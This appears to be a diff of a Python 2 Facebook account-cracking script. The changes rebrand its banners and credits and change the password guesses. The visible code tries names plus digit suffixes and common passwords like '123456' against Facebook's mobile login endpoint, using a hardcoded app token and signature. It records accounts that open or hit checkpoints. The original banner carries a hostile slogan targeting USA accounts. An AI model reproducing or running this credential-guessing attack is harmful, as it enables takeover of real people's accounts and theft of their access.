@@ -47,17 +47,17 @@ def jalan(z):
 
 ##### LOGO #####
 logo = """
- \033[1;98m●▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬●●▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●
-\033[1;97m╭━━━┳╮╱╭┳━━━┳╮╭━╮╭╮╱╭┳━━━┳━━━╮\033[1;94m▒▒▒▒   ╱▔▔▔▔╲ ▒▒▒  FUCK USA ACCOUNTS 🔥
-\033[1;97m┃╭━━┫┃╱┃┃╭━╮┃┃┃╭╯┃┃╱┃┃╭━╮┃╭━╮┃\033[1;94m▒▒▒▒ ▕ ╲┊┊╱▏ ▏▒▒▒ WE ARE PAKISTANIS 🔥
-\033[1;93m┃╰━━┫┃╱┃┃┃╱╰┫╰╯╯╱┃┃╱┃┃╰━━┫┃╱┃┃\033[1;94m▒▒▒▒ ▕▕▂╱╲▂▏▏▒▒▒ WE HAVE POWER 🔥
-\033[1;93m┃╭━━┫┃╱┃┃┃╱╭┫╭╮┃╱┃┃╱┃┣━━╮┃╰━╯┃\033[1;94m▒▒▒▒   ╲┊┊┊┊╱ ▒▒▒▒
-\033[1;91m┃┃╱╱┃╰━╯┃╰━╯┃┃┃╰╮┃╰━╯┃╰━╯┃╭━╮┃\033[1;94m▒▒▒▒    ╲▂▂╱▏ ▒▒▒▒
-\033[1;91m╰╯╱╱╰━━━┻━━━┻╯╰━╯╰━━━┻━━━┻╯╱╰╯\033[1;94m▒▒▒╱▔▔┊┊┊┊▔▔╲▒▒▒
+
+\033[1;91m╔══╦═╗─╔╦═══╦═══╦═╗╔═╗
+\033[1;91m╚╣╠╣║╚╗║╠╗╔╗║╔══╩╗╚╝╔╝
+\033[1;91m─║║║╔╗╚╝║║║║║╚══╗╚╗╔╝
+\033[1;91m─║║║║╚╗║║║║║║╔══╝╔╝╚╗
+\033[1;91m╔╣╠╣║─║║╠╝╚╝║╚══╦╝╔╗╚╗
+\033[1;91m╚══╩╝─╚═╩═══╩═══╩═╝╚═╝
 \033[1;98m●▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬●●▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●
 \033[1;91m╔🔥═══════════════════════════════════════════🔥═🔥═🔥╗
-\033[1;91m║\033[1;91m☆ \033[1;91mCOMMANDS MAKER Rana Aahil.☠️           ║
-\033[1;91m║\033[1;91m☆ \033[1;91mYOUTUBE CHANEEL Aahil Creations.☠️     ║
+\033[1;91m║\033[1;91m☆ \033[1;91mCOMMANDS MAKER Anamul Hasan.☠️           ║
+\033[1;91m║\033[1;91m☆ \033[1;91mYOUTUBE CHANEEL Jackroo-eng.☠️     ║
 \033[1;91m║\033[1;91m☆ \033[1;91mIM.NOT.RISPONSIBLE.FOR.ANY.MISS USE.☠️ ║
 \033[1;91m╚🔥═══════════════════════════════════════════🔥═🔥═🔥╝
 """
@@ -65,12 +65,14 @@ logo = """
 ###### LOGO2 ######
 logo2 = """
 	\033[1;32;40m  
-██████╗░░█████╗░███╗░░██╗░█████╗░
-██╔══██╗██╔══██╗████╗░██║██╔══██╗
-██████╔╝███████║██╔██╗██║███████║
-██╔══██╗██╔══██║██║╚████║██╔══██║
-██║░░██║██║░░██║██║░╚███║██║░░██║
-╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝╚═╝░░╚═╝
+	
+
+╭━━┳━╮╱╭┳━━━┳━━━┳━╮╭━╮
+╰┫┣┫┃╰╮┃┣╮╭╮┃╭━━┻╮╰╯╭╯
+╱┃┃┃╭╮╰╯┃┃┃┃┃╰━━╮╰╮╭╯
+╱┃┃┃┃╰╮┃┃┃┃┃┃╭━━╯╭╯╰╮
+╭┫┣┫┃╱┃┃┣╯╰╯┃╰━━┳╯╭╮╰╮
+╰━━┻╯╱╰━┻━━━┻━━━┻━╯╰━╯
   
 """
 
@@ -99,7 +101,7 @@ def login():
 		os.system('clear')
 		print logo
 		print 42*"\033[1;96m="
-		print('\033[1;96m[☆] \x1b[1;91mLOGIN KRO APNA ACOUNT \x1b[1;96m[☆]' )
+		print('\033[1;96m[☆] \x1b[1;91mLOGIN YOUR ACOUNT \x1b[1;96m[☆]' )
 		id = raw_input('\033[1;91m[+] \x1b[1;91mID/Email \x1b[1;91m: \x1b[1;92m')
 		pwd = raw_input('\033[1;91m[+] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;92m')
 		tik()
@@ -177,7 +179,7 @@ def menu():
 	print "\033[1;96m[\033[1;97m✓\033[1;96m]\033[1;93m Nama \033[1;91m: \033[1;92m"+nama+"\033[1;97m               "
 	print "\033[1;96m[\033[1;97m✓\033[1;96m]\033[1;93m ID   \033[1;91m: \033[1;92m"+id+"\x1b[1;97m              "
 	print 42*"\033[1;96m="
-	print "\x1b[1;96m[\x1b[1;92m1\x1b[1;96m]\x1b[1;36m Hack USA"
+	print "\x1b[1;96m[\x1b[1;92m1\x1b[1;96m]\x1b[1;36m Start Hacking"
 	print "\x1b[1;96m[\x1b[1;91m0\x1b[1;96m]\x1b[1;91m Logout"
 	pilih()
 
@@ -349,7 +351,7 @@ def pilih_super():
 									cek.close()
 									cekpoint.append(user+pass3)
 								else:
-									pass4 = b['last_name']+'1234'
+									pass4 = b['first_name']+'12'
 									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 									q = json.load(data)
 									if 'access_token' in q:
@@ -363,7 +365,7 @@ def pilih_super():
 											cek.close()
 											cekpoint.append(user+pass4)
 										else:
-											pass5 = ('qwerty')
+											pass5 = ('123456')
 											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 											q = json.load(data)
 											if 'access_token' in q:
@@ -377,7 +379,7 @@ def pilih_super():
 													cek.close()
 													cekpoint.append(user+pass5)
 												else:
-													pass6 = b['last_name']+'12345'
+													pass6 = b['first_name']+'12345'
 													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 													q = json.load(data)
 													if 'access_token' in q:
@@ -393,7 +395,7 @@ def pilih_super():
 														else:
 															a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
 															b = json.loads(a.text)
-															pass7 =  b['first_name']+'12345'
+															pass7 =  b['first_name']+'1122'
 															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 															q = json.load(data)
 															if 'access_token' in q:
@@ -409,7 +411,7 @@ def pilih_super():
 																else:
 																	a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
 																	b = json.loads(a.text)
-																	pass8 =  b['first_name']+'098'
+																	pass8 =  b['first_name']+'123456'
 																	data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 																	q = json.load(data)
 																	if 'access_token' in q:
